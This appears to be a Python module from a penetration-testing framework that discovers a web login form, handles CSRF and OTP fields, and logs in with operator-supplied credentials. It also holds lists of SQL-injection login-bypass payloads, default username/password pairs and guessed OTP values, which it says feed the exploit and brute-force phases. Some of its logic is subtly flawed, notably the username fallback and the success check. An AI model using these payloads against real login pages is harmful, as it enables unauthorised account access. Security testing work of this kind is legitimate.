"""VAJRA authenticated-scan bootstrap — web.auth_login.

When the operator supplies webapp credentials (--web-user/--web-pass and
optionally --web-login URL, --web-otp static code or --web-totp-secret
base32 secret), this module:

  1. discovers the login form (--web-login URL, else crawl seed pages and
     pick the best candidate with a password field),
  2. parses hidden CSRF / token fields (including <meta name=csrf-token>),
  3. POSTs the supplied credentials, injecting the OTP when the form asks
     for one (static value or RFC 6238 TOTP generated on the spot),
  4. adopts Set-Cookie session cookies into the framework HTTP client so
     every later web module (crawl, dirbuster, injection, tech, headers)
     runs in the authenticated context,
  5. verifies the session and records which identity it holds.

The exported AUTH_BYPASSES / OTP_TRICKS lists are shared with the exploit
phase and web login brute-forcing, so the auth logic stays in one place."""
import html
import re
from urllib.parse import urljoin

from core.database import Finding
from core.utils import extract_forms

LOGIN_HINTS = ("login", "signin", "sign-in", "signon", "sign-on", "auth",
               "session", "account", "user", "connect", "admin", "secure")
OTP_NAMES = {"otp", "code", "passcode", "twofa", "2fa", "mfa", "totp",
             "pin", "authcode", "verificationcode", "verification_code",
             "verification code", "one_time_code", "onetp"}
CSRF_NAMES = {"csrf", "csrf_token", "csrfmiddlewaretoken", "_token",
              "authenticity_token", "__requestverificationtoken",
              "_csrf", "x-csrf-token", "token"}
USER_NAMES = {"user", "username", "login", "email", "user_name",
              "userid", "user_id", "account", "j_username", "mail"}
PASS_NAMES = {"pass", "password", "pwd", "passwd", "j_password",
              "userpass", "passcode"}

# Auth-bypass payload families for password-login forms (username injection,
# comment-injection, tautologies, encoded variants). Each entry is a pair
# (username, password).
AUTH_BYPASSES = [
    ("' OR '1'='1'-- -", "x"),
    ("' OR '1'='1'--", "x"),
    ("' OR 1=1-- -", "x"),
    ("' OR 1=1--", "x"),
    ("' OR 1=1-- -", "x"),
    ("' OR 1=1#", "x"),
    ("admin'-- -", "x"),
    ("admin'--", "x"),
    ("admin'#", "x"),
    ("admin' /*", "x"),
    ("admin' OR '1'='1", "x"),
    ("') OR ('1'='1", "x"),
    ("'='", "'='"),
    ("1'='1", "x"),
    ("' or '1'='1' limit 1-- -", "x"),
    ('" OR ""="', "x"),
    ('admin" -- ', "x"),
    ("admin", "' OR '1'='1'-- -"),
    ("admin", "' OR 1=1-- -"),
    ("admin", "'='"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "administrator"),
    ("admin", "123456"),
    ("root", "root"),
]

# OTP-field tricks over and above using the real supplied OTP when possible.
OTP_TRICKS = ["", "000000", "111111", "123456", "0000000",
              "' OR '1'='1'-- -", "999999"]


def user_field(fields):
    for f in fields:
        n = (f.get("name") or "").lower()
        if n in USER_NAMES or ("user" in n and "conf" not in n
                               and "confirm" not in n and "password" not in n):
            return f["name"]
    for f in fields:
        t = (f.get("type") or "").lower()
        if t in ("email", "text") and (f.get("name") or "").strip():
            return f["name"]
    return None


def pass_field(fields):
    for f in fields:
        if (f.get("type") or "").lower() == "password":
            return f["name"]
    return None


def otp_field(fields):
    for f in fields:
        n = (f.get("name") or "").strip().lower()
        t = f.get("type")
        if n in OTP_NAMES or any(k in n for k in ("otp", "2fa", "mfa",
                                                   "passcode", "authcode",
                                                   "verification")):
            return f["name"]
    return None


def csrf_field(fields):
    for f in fields:
        t = (f.get("type") or "").lower()
        n = (f.get("name") or "").strip().lower()
        if t == "hidden" and (n in CSRF_NAMES or n.rstrip(")") in CSRF_NAMES
                              or n.endswith("token") or "csrf" in n):
            return f["name"]
    return None


def pick_login_form(forms):
    """Best login-form candidate: password field required, prefer actions
    whose URL carries an auth keyword."""
    best = None
    best_score = -1
    for f in forms:
        fields = f.get("fields", [])
        if not pass_field(fields):
            continue
        action = (f.get("action") or "").lower()
        score = sum(1 for h in LOGIN_HINTS if h in action)
        if not user_field(fields):
            score -= 0.5
        if score > best_score:
            best, best_score = f, score
    return best


def csrf_from_page(body, fieldname=None):
    """Pull a CSRF token from <meta> tags (fresh SPA logins often put it
    there instead of in the form)."""
    for m in re.finditer(r'<meta[^>]+name=["\'](?:csrf-token|csrf_token|_csrf)'
                         r'["\'][^>]+content=["\']([^"\']+)', body or "",
                         re.I):
        return html.unescape(m.group(1)).strip()
    return None


def build_data(fields, ufield, pfield, user_val, pass_val,
               otp=None, csrf_value=None):
    data = {}
    for f in fields:
        data[f["name"]] = f.get("value", "")
    if ufield:
        data[ufield] = user_val
    data[pfield] = pass_val
    if otp is not None:
        of = otp_field(fields)
        if of:
            data[of] = otp
    if csrf_value:
        cf = csrf_field(fields)
        if cf:
            data[cf] = csrf_value
    return {k: v for k, v in data.items() if v is not None}


def likely_logged_in(resp, action_html, pre_cookies):
    """Heuristic: status in 200-399, page no longer shows a password input
    nor an 'invalid/incorrect login' message, or we got a new session cookie."""
    loc = (resp.headers.get("location") or resp.url or "").lower()
    if loc and any(h in loc for h in ("login", "signin", "auth",
                                       "error", "failed")):
        return False
    body = resp.body or ""
    if re.search(r"invalid (user|credentials|login|password)|incorrect "
                 r"(password|credentials)|wrong password|login failed|"
                 r"authentication failed", body, re.I):
        return False
    if "<input" in body and re.search(r"type=[\"']password[\"']", body,
                                      re.I):
        return False
    cookies = resp.cookies_str
    new_cookie = cookies and _cfg_norm(cookies) != _cfg_norm(pre_cookies)
    return new_cookie or bool(loc) or (200 <= resp.status < 400)


def _cfg_norm(s):
    return " ".join(sorted(x.strip() for x in s.split(";"))) if s else ""


def _candidates(engine):
    """Ordered login candidates: explicit URL, then seed pages' forms."""
    cands = []
    web = engine.state.get("web_targets", []) or []
    explicit = getattr(engine.args, "web_login", None)
    if explicit:
        cands.append(explicit)
    for w in web:
        u = w["url"] if isinstance(w, dict) else str(w)
        if u not in cands:
            cands.append(u)
    return [c for c in cands if c][:6]


def login(engine):
    t = engine.target
    args = engine.args
    user = getattr(args, "web_user", None) or getattr(args, "web_pass", None)
    pwd = getattr(args, "web_pass", None) or ""
    if not user:
        return
    creds = {"user": user, "password": pwd,
             "otp": getattr(args, "web_otp", None) or "",
             "totp": getattr(args, "web_totp_secret", None) or "",
             "login": getattr(args, "web_login", None) or ""}
    engine.state["web_auth"] = {"user": user, "established": False,
                                "method": "form", "login_url": "",
                                "cookie": "", "csrf": ""}
    forms = []
    seen = set()
    for url in _candidates(engine):
        if url in seen:
            continue
        seen.add(url)
        try:
            r = engine.http.get(url, timeout=min(8, engine.http.timeout))
        except Exception:
            continue
        if not r.body:
            continue
        for f in extract_forms(r.body, r.url or url):
            if f["action"] not in [x["action"] for x in forms]:
                forms.append(f)
    form = pick_login_form(forms)
    if not form:
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "coverage", "info",
            "Authentication system not auto-discovered "
            "(use --web-login <url>)",
            detail="No login form with a password field was found on "
                   "the seed pages; supply --web-login to target the "
                   "authenticated flow explicitly.",
            confidence="possible"))
        return
    engine.state["web_auth"]["login_url"] = form["action"]
    ufield = user_field(form["fields"])
    pfield = pass_field(form["fields"])
    csrfv = csrf_field(form["fields"])
    token = ""
    if csrfv:
        page = engine.http.get(form["action"],
                               timeout=min(8, engine.http.timeout))
        hidden = next((f.get("value", "") for f in form["fields"]
                       if f["name"] == csrfv), "")
        token = csrf_from_page(page.body) or hidden

    otp_given = creds["otp"]
    if not otp_given and creds["totp"]:
        from core.crypto_mini import totp_codes
        try:
            otp_given = totp_codes(creds["totp"], window=1)[0]
        except Exception:
            otp_given = ""
    of = otp_field(form["fields"])
    engine.state["web_auth"]["csrf"] = token

    before = engine.http._cookie if hasattr(engine.http, "_cookie") else ""
    data = build_data(form["fields"], ufield, pfield, user, pwd,
                      otp=(otp_given if (of or otp_given) else ""),
                      csrf_value=(token if token else None))
    method = (form.get("method") or "post").lower()
    try:
        if method == "get":
            resp = engine.http.get(form["action"], params=data,
                                   allow_redirects=False)
        else:
            resp = engine.http.post(form["action"], data=data,
                                    allow_redirects=False)
    except Exception as e:
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "coverage", "info",
            "Login POST failed: %r" % e, confidence="possible"))
        return
    cookies = resp.cookies_str
    if cookies:
        engine.http.apply_cookies(cookies)
    loc = resp.headers.get("location") or ""
    follow = resp
    if loc:
        # login usually 302s; adopt the session cookie and follow manually so
        # the authenticated page is what we judge against.
        try:
            follow = engine.http.get(urljoin(form["action"], loc),
                                     timeout=min(8, engine.http.timeout))
        except Exception:
            pass
        extra = follow.cookies_str
        if extra:
            engine.http.apply_cookies(extra)
    ok = likely_logged_in(follow, form.get("page", ""), before) \
        or bool(cookies)
    engine.state["web_auth"]["established"] = ok
    engine.state["web_auth"]["cookie"] = follow.cookies_str or cookies
    engine.state["authenticated"] = ok
    method_note = "TOTP" if (not otp_given and creds["totp"]) else (
        "static OTP" if otp_given else "no MFA/OTP")
    detail = ("POST %s\nuser=%s\nmethod=form (%s)\ncsrf=%s\noauth sets:\n%s"
              % (form["action"], user, method_note,
                 token and "yes" or "no",
                 cookies and "\n".join(c.split(";")[0]
                                       for c in cookies.split("\n"))
                 or "(no Set-Cookie)"))
    if ok:
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "recon", "info",
            "AUTHENTICATED web session established as %s" % user,
            detail=detail,
            evidence="session cookie adopted; subsequent web modules run "
                     "authenticated",
            confidence="firm"))
        engine.log.success("[web-auth] authenticated as %s (%s) — %s"
                           % (user, method_note, form["action"]))
    else:
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "recon", "info",
            "Web login attempt did NOT establish a session (%s)"
            % method_note,
            detail=detail,
            evidence="post=%s status=%s len=%s\nredirect=%s" %
                     (form["action"], resp.status, len(resp.body or ""),
                      resp.headers.get("location", "")),
            confidence="possible"))
        engine.log.warn("[web-auth] login not confirmed for %s (%s)" %
                        (user, form["action"]))


def run(engine):
    login(engine)